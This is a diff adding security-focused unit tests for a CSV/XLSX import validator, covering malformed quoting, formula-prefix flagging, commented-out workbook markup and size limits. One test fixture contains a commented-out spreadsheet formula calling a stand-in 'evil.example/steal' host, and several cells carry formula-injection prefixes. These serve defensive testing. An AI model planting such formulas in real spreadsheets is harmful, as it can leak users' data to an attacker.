@@ -29,6 +29,7 @@ import {
   XLSX_MIME,
   csvBytes,
   makeXlsx,
+  misboundWorkbookContentTypesXml,
   sampleCsv,
   sampleXlsx,
   setZipEncryptionFlag,
@@ -503,6 +504,258 @@ describe("tabular validation", () => {
     );
   });
 
+  it("rejects junk after a closing CSV quote and quotes in unquoted fields", async () => {
+    await expect(
+      validateTabularImport({
+        bytes: csvBytes('Name\n"safe"attacker\n'),
+        filename: "junk-after-quote.csv",
+        declaredMimeType: CSV_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "malformed" });
+    await expect(
+      validateTabularImport({
+        bytes: csvBytes('Name\n"safe" attacker\n'),
+        filename: "space-after-quote.csv",
+        declaredMimeType: CSV_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "malformed" });
+    await expect(
+      validateTabularImport({
+        bytes: csvBytes('Name\nfoo"bar\n'),
+        filename: "quote-in-unquoted.csv",
+        declaredMimeType: CSV_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "malformed" });
+
+    const escaped = await validateTabularImport({
+      bytes: csvBytes(
+        'Name,Notes\n"He said ""ok""","a,b"\n"line\nbreak",done\n',
+      ),
+      filename: "quoted-controls.csv",
+      declaredMimeType: CSV_MIME,
+    });
+    expect(escaped.outcome).toBe("ready");
+    expect(escaped.previewRows).toEqual([
+      { sourceRowNumber: 2, cells: ['He said "ok"', "a,b"] },
+      { sourceRowNumber: 3, cells: ["line\nbreak", "done"] },
+    ]);
+  });
+
+  it("flags spreadsheet formula prefixes before whitespace normalization", async () => {
+    const csv = await validateTabularImport({
+      bytes: csvBytes(
+        '+Price,Name\n+1+1,Widget\n-2+3,"\t@SUM"\n"\n=1","\r-3"\n',
+      ),
+      filename: "formulas.csv",
+      declaredMimeType: CSV_MIME,
+    });
+    expect(csv.outcome).toBe("needs_attention");
+    expect(csv.headers[0]?.name).toBe("+Price");
+    expect(csv.previewRows.map((row) => row.cells)).toEqual([
+      ["+1+1", "Widget"],
+      ["-2+3", "@SUM"],
+      ["=1", "-3"],
+    ]);
+    expect(
+      csv.issues.filter((item) => item.code === "formula_like"),
+    ).toHaveLength(6);
+    expect(JSON.stringify(csv.issues)).not.toContain("+1+1");
+    expect(JSON.stringify(csv.issues)).not.toContain("-2+3");
+    expect(JSON.stringify(csv.issues)).not.toContain("@SUM");
+
+    const xlsx = await validateTabularImport({
+      bytes: await makeXlsx({
+        sheets: [
+          {
+            name: "Sheet1",
+            rows: [
+              ["+Price", "Name"],
+              ["+1+1", "Widget"],
+              ["-2+3", "\t@SUM"],
+              ["\n=1", "\r-3"],
+            ],
+          },
+        ],
+      }),
+      filename: "formulas.xlsx",
+      declaredMimeType: XLSX_MIME,
+    });
+    expect(xlsx.outcome).toBe("needs_attention");
+    expect(xlsx.headers[0]?.name).toBe("+Price");
+    expect(xlsx.previewRows.map((row) => row.cells)).toEqual([
+      ["+1+1", "Widget"],
+      ["-2+3", "@SUM"],
+      ["=1", "-3"],
+    ]);
+    expect(
+      xlsx.issues.filter((item) => item.code === "formula_like"),
+    ).toHaveLength(6);
+    expect(JSON.stringify(xlsx.issues)).not.toContain("+1+1");
+    expect(JSON.stringify(xlsx.issues)).not.toContain("@SUM");
+  });
+
+  it("ignores commented OOXML markup and rejects duplicate cell coordinates", async () => {
+    const commented = await validateTabularImport({
+      bytes: await makeXlsx({
+        sheets: [
+          {
+            name: "Sheet1",
+            rows: [["Name"], ["Widget"]],
+          },
+        ],
+        extras: {
+          "xl/workbook.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <!-- <sheet name="Evil" sheetId="99" r:id="rId99"/> -->
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>`,
+          "xl/_rels/workbook.xml.rels": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <!-- <Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/evil.xml"/> -->
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+</Relationships>`,
+          "xl/worksheets/sheet1.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheetData>
+    <row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>
+    <row r="2"><c r="A2" t="inlineStr"><is><t>Widget</t></is></c></row>
+    <!-- <c r="A2" t="inlineStr"><is><t>Attacker</t></is></c> -->
+    <!-- <c r="B2"><f>HYPERLINK("https://evil.example/steal","1")</f><v>1</v></c> -->
+  </sheetData>
+  <!-- <hyperlink ref="A2" r:id="rId9"/> -->
+  <!-- <mergeCell ref="A1:B2"/> -->
+</worksheet>`,
+        },
+      }),
+      filename: "comments.xlsx",
+      declaredMimeType: XLSX_MIME,
+    });
+    expect(commented.outcome).toBe("ready");
+    expect(commented.sheets.map((sheet) => sheet.name)).toEqual(["Sheet1"]);
+    expect(commented.previewRows).toEqual([
+      { sourceRowNumber: 2, cells: ["Widget"] },
+    ]);
+    expect(commented.issues.map((item) => item.code)).toEqual([]);
+
+    await expect(
+      validateTabularImport({
+        bytes: await makeXlsx({
+          sheets: [{ name: "Sheet1", rows: [["Name"], ["Widget"]] }],
+          extras: {
+            "xl/worksheets/sheet1.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1" t="inlineStr"><is><t>Name</t></is></c>
+      <c r="A1" t="inlineStr"><is><t>Attacker</t></is></c>
+    </row>
+  </sheetData>
+</worksheet>`,
+          },
+        }),
+        filename: "duplicate-cell.xlsx",
+        declaredMimeType: XLSX_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "malformed" });
+  });
+
+  it("counts every populated XLSX cell toward the aggregate text limit", async () => {
+    await expect(
+      validateTabularImport({
+        bytes: await makeXlsx({
+          sheets: [
+            {
+              name: "Sheet1",
+              rows: columnARows(TABULAR_MAX_AGGREGATE_CHARS - 1),
+            },
+          ],
+        }),
+        filename: "xlsx-aggregate.xlsx",
+        declaredMimeType: XLSX_MIME,
+      }),
+    ).resolves.toMatchObject({ outcome: "ready" });
+    await expect(
+      validateTabularImport({
+        bytes: await makeXlsx({
+          sheets: [
+            {
+              name: "Sheet1",
+              rows: columnARows(TABULAR_MAX_AGGREGATE_CHARS),
+            },
+          ],
+        }),
+        filename: "xlsx-aggregate-over.xlsx",
+        declaredMimeType: XLSX_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "text_too_large" });
+
+    const extraOk = await validateTabularImport({
+      bytes: await makeXlsx({
+        sheets: [
+          {
+            name: "Sheet1",
+            rows: extraColumnRows(TABULAR_MAX_AGGREGATE_CHARS - 1),
+          },
+        ],
+      }),
+      filename: "xlsx-extra-aggregate.xlsx",
+      declaredMimeType: XLSX_MIME,
+    });
+    expect(extraOk.outcome).toBe("needs_attention");
+    expect(extraOk.issues.some((item) => item.code === "extra_columns")).toBe(
+      true,
+    );
+    expect(extraOk.previewRows[0]?.cells).toEqual([""]);
+    expect(extraOk.previewRows[0]?.cells).toHaveLength(1);
+
+    await expect(
+      validateTabularImport({
+        bytes: await makeXlsx({
+          sheets: [
+            {
+              name: "Sheet1",
+              rows: extraColumnRows(TABULAR_MAX_AGGREGATE_CHARS),
+            },
+          ],
+        }),
+        filename: "xlsx-extra-aggregate-over.xlsx",
+        declaredMimeType: XLSX_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "text_too_large" });
+
+    await expect(
+      validateTabularImport({
+        bytes: await makeXlsx({
+          sheets: [
+            { name: "Visible", rows: [["Name"], ["A"]] },
+            {
+              name: "Secret",
+              state: "hidden",
+              rows: extraColumnRows(TABULAR_MAX_AGGREGATE_CHARS),
+            },
+          ],
+        }),
+        filename: "xlsx-hidden-extra-aggregate.xlsx",
+        declaredMimeType: XLSX_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "text_too_large" });
+  });
+
+  it("requires the canonical workbook part to carry the XLSX main content type", async () => {
+    await expect(
+      validateTabularImport({
+        bytes: await makeXlsx({
+          sheets: [{ name: "Sheet1", rows: [["Name"], ["A"]] }],
+          contentTypesXml: misboundWorkbookContentTypesXml(1),
+        }),
+        filename: "misbound.xlsx",
+        declaredMimeType: XLSX_MIME,
+      }),
+    ).rejects.toMatchObject({ code: "type_mismatch" });
+  });
+
   it("does not change PDF/DOCX/TXT document validation or Phase 4C offering validation", async () => {
     await expect(
       validateDocument({
@@ -548,3 +801,38 @@ describe("tabular validation", () => {
     ).toBe(true);
   });
 });
+
+function columnARows(dataChars: number): string[][] {
+  return [["H"], ...chunkedCells(dataChars, (text) => [text])];
+}
+
+function extraColumnRows(extraChars: number): string[][] {
+  return [["H"], ...chunkedCells(extraChars, (text) => ["", text])];
+}
+
+function chunkedCells(
+  totalChars: number,
+  makeRow: (text: string) => string[],
+): string[][] {
+  const rows: string[][] = [];
+  let remaining = totalChars;
+  let row = 0;
+  while (remaining > 0) {
+    const chunk = Math.min(TABULAR_MAX_CELL_CHARS, remaining);
+    rows.push(makeRow(noisyText(row, chunk)));
+    remaining -= chunk;
+    row += 1;
+  }
+  return rows;
+}
+
+function noisyText(row: number, length: number): string {
+  const alphabet = "0123456789abcdefghijklmnopqrstuvwxyz";
+  let state = ((row + 1) * 1_000_003) >>> 0;
+  let text = "";
+  for (let index = 0; index < length; index += 1) {
+    state = (Math.imul(state, 1664525) + 1013904223) >>> 0;
+    text += alphabet[state % 36];
+  }
+  return text;
+}
